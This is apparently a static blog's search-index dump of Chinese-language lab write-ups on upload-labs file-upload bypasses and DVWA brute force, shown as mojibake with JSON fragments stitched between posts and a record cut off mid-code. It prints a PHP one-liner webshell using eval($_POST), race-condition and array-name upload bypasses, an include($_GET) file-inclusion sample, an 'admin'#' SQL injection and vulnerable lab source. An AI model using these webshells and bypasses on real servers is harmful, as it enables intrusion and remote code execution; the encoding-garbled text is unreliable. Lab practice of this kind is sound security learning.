-ã€‹æ–‡ä»¶åŒ…å«æ¼æ´åŸç†ï¼šæ–‡ä»¶åŒ…å«å‡½æ•°åŠ è½½çš„å‚æ•°æ²¡æœ‰ç»è¿‡è¿‡æ»¤æˆ–è€…ä¸¥æ ¼çš„å®šä¹‰ï¼Œå¯ä»¥è¢«ç”¨æˆ·æ§åˆ¶ï¼ŒåŒ…å«å…¶ä»–æ¶æ„æ–‡ä»¶ï¼Œå¯¼è‡´äº†æ‰§è¡Œäº†éé¢„æœŸçš„ä»£ç ã€‚ ç¤ºä¾‹ä»£ç ï¼š &lt;?php $filename = $_GET[&#39;filename&#39;]; include($filename); ?&gt; 12345678910111213141516171819202122232425262728293031å‚è€ƒèµ„æ–™ï¼šhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;Vansnc&#x2F;article&#x2F;details&#x2F;82528395# pass-14ï¼šæ–‡ä»¶å¤´æ£€æŸ¥ç»•è¿‡* æŸ¥çœ‹æºç ï¼Œå‘ç°æœåŠ¡å™¨åªæ£€æŸ¥æ–‡ä»¶å†…å®¹çš„å‰ä¸¤ä¸ªå­—èŠ‚è¡¥å……ï¼šä¸€èˆ¬æ–‡ä»¶å†…å®¹çš„å‰ä¸¤ä¸ªå­—èŠ‚ä¼šä½“ç°å‡ºè‡ªå·±æ˜¯ä»€ä¹ˆç±»å‹çš„æ–‡ä»¶ï¼ˆå¯ä»¥ç”¨winhexæŸ¥çœ‹ï¼‰ã€‚å› æ­¤æœ¬passç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ç»•è¿‡äº†ã€‚* å›¾ç‰‡é©¬çš„åˆ©ç”¨ï¼š ä¸€èˆ¬å›¾ç‰‡é©¬æ˜¯æ— æ³•ç›´æ¥è¿æ¥èšå‰‘çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥æ­é…æ–‡ä»¶åŒ…å«æ¼æ´æ¥æ“ä½œæœåŠ¡å™¨ã€‚ç‚¹å¼€pass-14æ³¨æ„2çš„æ–‡ä»¶åŒ…å«æ¼æ´ç½‘é¡µï¼Œurlæ è¾“å…¥ï¼š?file&#x3D;.&#x2F;upload&#x2F;æ–‡ä»¶å![2](upload-labs-pass14&#x2F;2.png)# pass-15ï¼šçªç ´getimagesize()æŸ¥çœ‹æºç ï¼š&#96;&#96;&#96;phpif(file_exists($filename))&#123; $info &#x3D; getimagesize($filename); $ext &#x3D; image_type_to_extension($info[2]);&#x2F;&#x2F;æ ¹æ®ç´¢å¼•2çš„å€¼è½¬æ¢ä¸ºå¯¹åº”åç¼€ if(stripos($types,$ext)&gt;&#x3D;0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125; æ–°å‡½æ•°ï¼š â€”ï¼‰getimagesize() åŠŸèƒ½ï¼šç”¨äºè·å–å›¾åƒå¤§å°åŠç›¸å…³ä¿¡æ¯ï¼ŒæˆåŠŸè¿”å›ä¸€ä¸ªæ•°ç»„ï¼ˆæˆå‘˜ä¸ºç´¢å¼•0ã€1ã€2ã€3ç­‰ç­‰ï¼‰ï¼Œå¤±è´¥åˆ™è¿”å› FALSE å¹¶äº§ç”Ÿä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ä¿¡æ¯ã€‚ ç´¢å¼• 0 ç»™å‡ºçš„æ˜¯å›¾åƒå®½åº¦çš„åƒç´ å€¼ ç´¢å¼• 1 ç»™å‡ºçš„æ˜¯å›¾åƒé«˜åº¦çš„åƒç´ å€¼ ç´¢å¼• 2 ç»™å‡ºçš„æ˜¯å›¾åƒçš„ç±»å‹ï¼Œè¿”å›çš„æ˜¯æ•°å­—ï¼Œå…¶ä¸­1 = GIFï¼Œ2 = JPGï¼Œ3 = PNGï¼Œ4 = SWFï¼Œ5 = PSDï¼Œ6 = BMPï¼Œ7 = TIFF(intel byte order)ï¼Œ8 = TIFF(motorola byte order)ï¼Œ9 = JPCï¼Œ10 = JP2ï¼Œ11 = JPXï¼Œ12 = JB2ï¼Œ13 = SWCï¼Œ14 = IFFï¼Œ15 = WBMPï¼Œ16 = XBM ç´¢å¼• 3 ç»™å‡ºçš„æ˜¯ä¸€ä¸ªå®½åº¦å’Œé«˜åº¦çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç›´æ¥ç”¨äº HTML çš„ &lt;imageæ ‡ç­¾ èœé¸Ÿæ•™ç¨‹å®ä¾‹ï¼š é‚£ä¹ˆè¿™å…³ä¹Ÿæ˜¯ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ç»•è¿‡ã€‚ pass-16ï¼šçªç ´exif_imagetype() exif_imagetype()å‡½æ•°ï¼š åŠŸèƒ½ï¼šè¯»å–ä¸€ä¸ªå›¾åƒçš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¹¶æ£€æŸ¥å…¶ç­¾åã€‚å¦‚æœå‘ç°äº†æ°å½“çš„ç­¾ååˆ™è¿”å›ä¸€ä¸ªå¯¹åº”çš„å¸¸é‡ï¼Œå¦åˆ™è¿”å› FALSEã€‚è¿™ä¸ªç­¾åï¼ˆä¹Ÿå¯ä»¥ç§°ä¸ºå€¼ï¼‰å’Œ getimagesize() è¿”å›çš„æ•°ç»„ä¸­çš„ç´¢å¼• 2 çš„å€¼æ˜¯ä¸€æ ·çš„ï¼Œä½†æœ¬å‡½æ•°å¿«å¾—å¤šã€‚ é‚£ä¹ˆè¿™å…³ä¹Ÿæ˜¯ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ç»•è¿‡ã€‚ pass-17ï¼šäºŒæ¬¡æ¸²æŸ“ç»•è¿‡pass-18ï¼šæ¡ä»¶ç«äº‰â€”â€”æ—¶é—´å‹ ä»£ç å®¡è®¡ï¼šæœåŠ¡å™¨å…ˆä¸Šä¼ äº†å›¾ç‰‡ï¼Œå†åˆ¤æ–­åç¼€æ˜¯å¦ç¬¦åˆï¼Œç¬¦åˆåˆ™é‡å‘½åï¼Œä¸ç¬¦åˆåˆ™åˆ é™¤ã€‚ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨æˆ‘ä»¬ä¸Šä¼ äº†ä¸ç¬¦åˆçš„å›¾ç‰‡æœåŠ¡å™¨ä¿å­˜åˆ°å…¶åˆ é™¤è‚¯å®šä¼šæœ‰æ—¶é—´å·®çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸€æ—¶é—´å·®è¿›è¡Œæˆ‘ä»¬çš„æ“ä½œï¼šä¸Šä¼ æ–°çš„ä¸€å¥è¯æœ¨é©¬ï¼š &lt; ?php fputs(fopen(â€˜shell.phpâ€™,â€™wâ€™),â€™&lt; ?php @eval($_POST[â€œpassâ€])?&gt;â€™);?&gt; æ–°å‡½æ•°ï¼š â€”ï¼‰fputs() å‡½æ•°â€”â€”åˆ«åfwrite åŠŸèƒ½ï¼šå†™å…¥æ–‡ä»¶ï¼ˆå¯å®‰å…¨ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ï¼‰ è¯­æ³•ï¼šfputs(file,string,length) å‚æ•° æè¿° file å¿…éœ€ã€‚è§„å®šè¦å†™å…¥çš„æ‰“å¼€æ–‡ä»¶ã€‚ string å¿…éœ€ã€‚è§„å®šè¦å†™å…¥æ–‡ä»¶çš„å­—ç¬¦ä¸²ã€‚ length å¯é€‰ã€‚è§„å®šè¦å†™å…¥çš„æœ€å¤§å­—èŠ‚æ•°ã€‚ â€”ï¼‰fopen()å‡½æ•° åŠŸèƒ½ï¼šæ‰“å¼€æ–‡ä»¶æˆ–è€… URLã€‚ è¯­æ³•ï¼šfopen(filename,mode,include_path,context) å‚æ•° æè¿° filename å¿…éœ€ã€‚è§„å®šè¦æ‰“å¼€çš„æ–‡ä»¶æˆ– URLã€‚ mode å¿…éœ€ã€‚è§„å®šè¦æ±‚åˆ°è¯¥æ–‡ä»¶/æµçš„è®¿é—®ç±»å‹ã€‚å¯èƒ½çš„å€¼è§ä¸‹è¡¨ã€‚ include_path å¯é€‰ã€‚å¦‚æœä¹Ÿéœ€è¦åœ¨ include_path ä¸­æ£€ç´¢æ–‡ä»¶çš„è¯ï¼Œå¯ä»¥å°†è¯¥å‚æ•°è®¾ä¸º 1 æˆ– TRUEã€‚ context å¯é€‰ã€‚è§„å®šæ–‡ä»¶å¥æŸ„çš„ç¯å¢ƒã€‚Context æ˜¯å¯ä»¥ä¿®æ”¹æµçš„è¡Œä¸ºçš„ä¸€å¥—é€‰é¡¹ã€‚ å…¶ä¸­modeå¯é€‰çš„ç±»å‹æœ‰ï¼š mode è¯´æ˜ â€œrâ€ åªè¯»æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ã€‚ â€œr+â€ è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ã€‚ â€œwâ€ å†™å…¥æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´å¹¶å°†æ–‡ä»¶å¤§å°æˆªä¸ºé›¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚ â€œw+â€ è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´å¹¶å°†æ–‡ä»¶å¤§å°æˆªä¸ºé›¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚ â€œaâ€ å†™å…¥æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶æœ«å°¾ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚ â€œa+â€ è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶æœ«å°¾ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚ â€œxâ€ åˆ›å»ºå¹¶ä»¥å†™å…¥æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ fopen() è°ƒç”¨å¤±è´¥å¹¶è¿”å› FALSEï¼Œå¹¶ç”Ÿæˆä¸€æ¡ E_WARNING çº§åˆ«çš„é”™è¯¯ä¿¡æ¯ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚è¿™å’Œç»™åº•å±‚çš„ open(2) ç³»ç»Ÿè°ƒç”¨æŒ‡å®š O_EXCL|O_CREAT æ ‡è®°æ˜¯ç­‰ä»·çš„ã€‚æ­¤é€‰é¡¹è¢« PHP 4.3.2 ä»¥åŠä»¥åçš„ç‰ˆæœ¬æ‰€æ”¯æŒï¼Œä»…èƒ½ç”¨äºæœ¬åœ°æ–‡ä»¶ã€‚ â€œx+â€ åˆ›å»ºå¹¶ä»¥è¯»å†™æ–¹å¼æ‰“å¼€ï¼Œå°†æ–‡ä»¶æŒ‡é’ˆæŒ‡å‘æ–‡ä»¶å¤´ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œåˆ™ fopen() è°ƒç”¨å¤±è´¥å¹¶è¿”å› FALSEï¼Œå¹¶ç”Ÿæˆä¸€æ¡ E_WARNING çº§åˆ«çš„é”™è¯¯ä¿¡æ¯ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨åˆ™å°è¯•åˆ›å»ºä¹‹ã€‚è¿™å’Œç»™åº•å±‚çš„ open(2) ç³»ç»Ÿè°ƒç”¨æŒ‡å®š O_EXCL|O_CREAT æ ‡è®°æ˜¯ç­‰ä»·çš„ã€‚æ­¤é€‰é¡¹è¢« PHP 4.3.2 ä»¥åŠä»¥åçš„ç‰ˆæœ¬æ‰€æ”¯æŒï¼Œä»…èƒ½ç”¨äºæœ¬åœ°æ–‡ä»¶ã€‚ æŠŠè¿™ä¸ªphpæ–‡ä»¶é€šè¿‡burpä¸€ç›´ä¸åœçš„ä¸Šä¼ ï¼Œæ€»ä¼šæœ‰é‚£ä¹ˆä¸€ç¬é—´æ˜¯è¿˜æ²¡æ¥å¾—åŠåˆ é™¤å°±å¯ä»¥è¢«è®¿é—®åˆ°çš„ï¼ˆå¯ä»¥é€šè¿‡å¢åŠ burpsuiteçº¿ç¨‹æ¥æé«˜å‡ ç‡ï¼‰ï¼Œä¸€æ—¦è®¿é—®åˆ°è¯¥æ–‡ä»¶å°±ä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªwebshell2.0.phpçš„ä¸€å¥è¯ï¼Œç„¶åç”¨èšå‰‘è¿æ¥shell.phpå³å¯ã€‚ pass-19ï¼šæ¡ä»¶ç«äº‰pass-20 ä»£ç å®¡è®¡ï¼š 1234567891011121314151617181920212223242526 $is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#x27;save_name&#x27;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125;else&#123; $msg = &#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; æ–°å‡½æ•°ï¼š â€”ï¼‰pathinfo()å‡½æ•° åŠŸèƒ½ï¼šä»¥æ•°ç»„çš„å½¢å¼è¿”å›æ–‡ä»¶è·¯å¾„çš„ä¿¡æ¯ è¯­æ³•ï¼špathinfo(path,process_sections) å‚æ•° æè¿° path å¿…éœ€ã€‚è§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚ process_sections å¯é€‰ã€‚è§„å®šè¦è¿”å›çš„æ•°ç»„å…ƒç´ ã€‚é»˜è®¤æ˜¯ allã€‚å¯èƒ½çš„å€¼ï¼šPATHINFO_DIRNAME - åªè¿”å› dirnameï¼ˆç›®å½•è·¯å¾„ï¼‰PATHINFO_BASENAME - åªè¿”å› basenameï¼ˆæ–‡ä»¶åï¼‰PATHINFO_EXTENSION - åªè¿”å› extensionï¼ˆæ–‡ä»¶ååç¼€ï¼‰ æ„Ÿè§‰è¿™å…³å°±æ˜¯å‰é¢çš„é»‘åå•ç»•è¿‡ï¼Œæ‰“ç»„åˆæ‹³å°±å¥½äº†ã€‚ pass-21 ä»£ç å®¡è®¡ï¼š 123456789101112131415161718192021222324252627282930313233$is_upload = false;$msg = null;if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123; //æ£€æŸ¥MIME $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;); if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;; &#125;else&#123; //æ£€æŸ¥æ–‡ä»¶å $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;]; if (!is_array($file)) &#123; $file = explode(&#x27;.&#x27;, strtolower($file)); &#125; $ext = end($file); $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); if (!in_array($ext, $allow_suffix)) &#123; $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;; &#125;else&#123; $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1]; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;; $is_upload = true; &#125; else &#123; $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;; &#125; &#125; &#125;&#125;else&#123; $msg = &quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;&#125; æ–°å‡½æ•°ï¼š â€”ï¼‰empty()å‡½æ•° åŠŸèƒ½ï¼šç”¨äºæ£€æŸ¥ä¸€ä¸ªå˜é‡æ˜¯å¦ä¸ºç©ºã€‚ â€”ï¼‰explode()å‡½æ•° åŠŸèƒ½ï¼šæŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚ è¯­æ³•ï¼šexplode(separator,string,limit) å‚æ•° æè¿° separator å¿…éœ€ã€‚è§„å®šåœ¨å“ªé‡Œåˆ†å‰²å­—ç¬¦ä¸²ã€‚ string å¿…éœ€ã€‚è¦åˆ†å‰²çš„å­—ç¬¦ä¸²ã€‚ limit å¯é€‰ã€‚è§„å®šæ‰€è¿”å›çš„æ•°ç»„å…ƒç´ çš„æ•°ç›®ã€‚å¯èƒ½çš„å€¼ï¼šå¤§äº 0 - è¿”å›åŒ…å«æœ€å¤š limit ä¸ªå…ƒç´ çš„æ•°ç»„ï¼›å°äº 0 - è¿”å›åŒ…å«é™¤äº†æœ€åçš„ -limit ä¸ªå…ƒç´ ä»¥å¤–çš„æ‰€æœ‰å…ƒç´ çš„æ•°ç»„ï¼›0 - è¿”å›åŒ…å«ä¸€ä¸ªå…ƒç´ çš„æ•°ç»„ â€”ï¼‰is_array() å‡½æ•° åŠŸèƒ½ï¼šç”¨äºæ£€æµ‹å˜é‡æ˜¯å¦æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ â€”ï¼‰end()å‡½æ•° åŠŸèƒ½ï¼šå°†æ•°ç»„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æœ€åä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¿”å›è¯¥å…ƒç´ çš„å€¼ï¼ˆå¦‚æœæˆåŠŸï¼‰ã€‚ è¯­æ³•ï¼šend(array) å‚æ•° æè¿° array å¿…éœ€ã€‚è§„å®šè¦ä½¿ç”¨çš„æ•°ç»„ã€‚ ç›¸å…³çš„å‡½æ•°ï¼š current() - è¿”å›æ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ next() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸‹ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º prev() - å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º reset()- å°†å†…éƒ¨æŒ‡é’ˆæŒ‡å‘æ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ï¼Œå¹¶è¾“å‡º each() - è¿”å›å½“å‰å…ƒç´ çš„é”®åå’Œé”®å€¼ï¼Œå¹¶å°†å†…éƒ¨æŒ‡é’ˆå‘å‰ç§»åŠ¨ æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å…ˆå¯¹ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡Œäº†MIMEæ£€æŸ¥ï¼Œç„¶ååˆ¤æ–­save_nameå‚æ•°æ˜¯å¦ä¸ºç©ºï¼Œä¸ºç©ºå°±æŠŠæ–‡ä»¶æœ¬æ¥åç§°èµ‹å€¼ç»™$file,å¦åˆ™å°±æ˜¯å°†save_nameå‚æ•°çš„å€¼èµ‹ç»™$fileã€‚æ¥ç€åˆ¤æ–­$fileæ˜¯å¦æ˜¯æ•°ç»„ï¼Œå¦‚æœä¸æ˜¯æ•°ç»„åˆ™æ‹†é™¤æ•°ç»„ï¼Œå°†æ•°ç»„çš„æœ€åä¸€ä¸ªå…ƒç´ ï¼ˆä¹Ÿå°±æ˜¯åç¼€ï¼‰å’Œå…è®¸ä¸Šä¼ æ–‡ä»¶åç¼€ç›¸æ¯”ï¼Œè‹¥ç¬¦åˆåˆ™å–$fileæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ åŠ .å’Œ$fileçš„ç¬¬äºŒä¸ªå…ƒç´ ä½œä¸ºæ–°çš„æ–‡ä»¶åï¼Œå¹¶å°†å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ åˆ°æŒ‡å®šè·¯å¾„ã€‚ è¡¥å……çŸ¥è¯†ï¼šå¯¹äºåƒ.php/.è¿™æ ·çš„æ–‡ä»¶è·¯å¾„ï¼Œmove_uploaded_file()å‡½æ•°ä¼šå¿½ç•¥æ‰æ–‡ä»¶æœ«å°¾çš„/.ã€‚å¦‚æ­¤ä¸€æ¥æˆ‘ä»¬ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„æ–‡ä»¶è¿˜æ˜¯è¢«é‡å‘½åä¸ºäº†phpåç¼€ã€‚ é‚£ä¹ˆè¿™å…³æˆ‘ä»¬çš„æƒ³æ³•æ˜¯ï¼šæå‰å°†save_nameè®¾ç½®ä¸ºæ•°ç»„ï¼Œå³ä»¤save_name[0]=webshell.php/ã€save_name[2]=jpgï¼Œå…¶ä¸­save_name[1]çš„å€¼ä¸ºç©ºã€‚è¿™æ ·å°±å¯ä»¤$file_name=webshell.php/.ã€‚ä½†æ˜¯è¿™è¾¹æœ‰ä¸ªç–‘é—®ï¼Œsave_nameæ•°ç»„çš„å…ƒç´ ä¸ªæ•°ä¸æ˜¯ä¸‰ä¸ªå—ï¼Œ$file[count($file) - 1]=$file[2]å•Šã€‚ä½†æ˜¯å…¶å®æˆ‘ä»¬åªå¯¹æ•°ç»„èµ‹å€¼äº†ä¸¤ä¸ªå…ƒç´ ï¼Œå› æ­¤countçš„å€¼ä¸º2ï¼Œè¿™å°±ç›¸å½“äºä½ æœ‰3ä¸ªå£è¢‹ï¼Œä½†æ˜¯åªæœ‰ä¸¤ä¸ªå£è¢‹æœ‰é’±ã€‚ ä¸‹é¢æ˜¯å®è·µï¼š","tags":[{"name":"upload-labs","slug":"upload-labs","permalink":"http://example.com/tags/upload-labs/"}]},{"title":"DVWAâ€”Brute Force","date":"2021-02-16T13:36:40.000Z","path":"2021/02/16/DVWAâ€”Brute Force/","text":"å‰è¨€è¯¥ç³»åˆ—çš„å®éªŒä¸»è¦å›´ç»•åˆ©ç”¨burpsuiteçš„æš´åŠ›ç ´è§£ã€‚æš´åŠ›ç ´è§£ï¼Œæ˜¯æŒ‡é»‘å®¢åˆ©ç”¨å¯†ç å­—å…¸ï¼Œä½¿ç”¨ç©·ä¸¾æ³•çŒœè§£å‡ºç”¨æˆ·å£ä»¤ï¼Œæ˜¯ç°åœ¨æœ€ä¸ºå¹¿æ³›ä½¿ç”¨çš„æ”»å‡»æ‰‹æ³•ä¹‹ä¸€ã€‚ LowæŸ¥çœ‹æºç ï¼š 1234$user = $_GET[ &#x27;username&#x27; ]; $pass = $_GET[ &#x27;password&#x27; ]; $pass = md5( $pass ); $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœåŠ¡å™¨å¯¹è¾“å…¥çš„è´¦å·å¯†ç æ²¡æœ‰åšä»»ä½•è¿‡æ»¤å¤„ç†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ‰ä¸¤ç§æ–¹æ³•ï¼š 1)SQLæ³¨å…¥ è¾“å…¥usernameï¼šadminâ€™#ï¼Œpasswordï¼šéšä¾¿è¾“ã€‚ 2)æš´åŠ›ç ´è§£ è¾“å…¥ç›®æ ‡è´¦å·å’Œéšæ„å¯†ç ï¼ŒæŠ“åŒ…ï¼š ![1](DVWAâ€”Brute Force/1.png) send to intruderï¼Œæ¸…é™¤æ ‡è®°ï¼Œå¯¹å¸Œæœ›çˆ†ç ´çš„å€¼æ ‡è®°ï¼š![2](DVWAâ€”Brute Force/2.png) é€‰æ‹©payloadï¼Œè½½å…¥å­—å…¸ï¼š![3](DVWAâ€”Brute Force/3.png) start attackï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å½“payloadçš„å€¼ä¸ºpasswordæ—¶å›æ–‡çš„é•¿åº¦ä¸ä¼—ä¸åŒï¼Œå› æ­¤æˆ‘ä»¬å¾—çŸ¥ç”¨æˆ·adminçš„å¯†ç ä¸ºpassword![4](DVWAâ€”Brute Force/4.png) MediumæŸ¥çœ‹æºç ï¼š 1234567if(isset($_GET[&#x27;Login&#x27;]))&#123; $user=$_GET[&#x27;username&#x27;]; $user=mysql_real_escape_string($user); $pass=$_GET[&#x27;password&#x27;]; $pass=mysql_real_escape_string($pass);$pass=md5($pass);$query=&quot;SELECT*FROM`users`WHEREuser=&#x27;$user&#x27;ANDpassword=&#x27;$pass&#x27;;&quot;; æˆ‘ä»¬çœ‹åˆ°æœåŠ¡å™¨å¯¹è´¦å·å¯†ç éƒ½åšäº†è¿‡æ»¤å¤„ç†ï¼Œå¯¹ä¸€äº›æ•æ„Ÿå­—ç¬¦è¿›è¡Œäº†è½¬ä¹‰ã€‚å®æˆ˜ä¸­å¦‚æœç›®æ ‡æœåŠ¡å™¨çš„MySQLæ•°æ®åº“é‡‡ç”¨gbkç¼–ç ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é‡Œç”¨å®½å­—èŠ‚ç»•è¿‡ï¼Œä½†æ˜¯æˆ‘è¿™è¾¹æ•°æ®åº“æ²¡æœ‰è¿™ä¹ˆè®¾ç½®ï¼Œå› æ­¤æˆ‘ä»¬ç”¨SQLæ³¨å…¥æ˜¯ä¸å¤§å¯èƒ½å®ç°äº†ï¼Œæˆ‘ä»¬æ¥ç€çœ‹æºç å‘ç°ç»•è¿‡æˆ‘ä»¬è¾“å…¥äº†é”™è¯¯çš„è´¦å·å¯†ç ï¼ŒæœåŠ¡å™¨ä¹Ÿåªä¼šå»¶è¿Ÿç½‘é¡µä¸¤ç§’è€Œå·²ï¼Œä¸ç®—æœ‰æ•ˆçš„é˜²çˆ†ç ´æœºåˆ¶ã€‚ä¸€æ¬¡æœ¬å…³ä»ä½¿ç”¨æš´åŠ›ç ´è§£ï¼Œå…·ä½“åŒä¸Šä¸€å…³ã€‚ HighæŸ¥çœ‹æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); // Sanitise username input $user = $_GET[ &#x27;username&#x27; ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); // Sanitise password input $pass = $_GET[ &#x27;password&#x27; ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass = md5( $pass ); // Check database $query = &quot;SELECT * FROM `users` WHERE user = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar 